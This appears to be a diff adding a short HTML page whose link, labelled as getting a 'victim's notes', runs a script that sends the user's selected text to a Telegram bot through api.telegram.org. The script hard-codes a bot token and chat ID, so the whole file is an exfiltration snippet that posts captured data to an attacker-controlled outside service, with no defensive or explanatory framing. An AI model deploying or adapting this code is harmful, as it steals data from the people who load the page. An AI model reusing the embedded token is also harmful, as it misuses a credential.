@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+ <head></head> 
+ <body> 
+  <a id="get-notes" href="#">Click here to get victim's notes!</a>
+  <script>
+  document.getElementById('get-notes').addEventListener('click', function() {
+    var notes = window.getSelection().toString();
+    if (notes.length > 0) {
+      var token = "6983080428:AAHNd_EiGNA8hjXVCA_mV_RoGZ5vmlYCDJc";  // Your Telegram bot token
+      var chatId = "6766631595";    // Your Telegram chat ID
+      var message = encodeURIComponent("Received notes:\n" + notes);
+      var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + message;
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      xhr.send();
+    }
+  });
+  </script>
+ 
+</body></html>
